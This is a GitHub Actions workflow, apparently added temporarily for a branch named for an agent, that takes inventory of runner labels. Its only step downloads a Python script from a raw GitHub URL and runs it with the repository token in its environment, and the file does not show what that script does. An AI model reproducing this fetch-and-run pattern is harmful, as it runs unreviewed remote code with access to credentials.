name: Temporary runner label inventory PR
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
  pull-requests: read
jobs:
  inventory:
    if: github.head_ref == 'agent/runner-label-policy'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Inventory runs-on filters
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          git fetch --prune origin '+refs/heads/*:refs/remotes/origin/*'
          curl -fsSL 'https://raw.githubusercontent.com/MishkaStrategy/TB/bdd650553c1e09da55f90d78a9e618a8c6a4ff06/.github/scripts/temp_runner_inventory.py' -o /tmp/runner_inventory.py
          python3 /tmp/runner_inventory.py
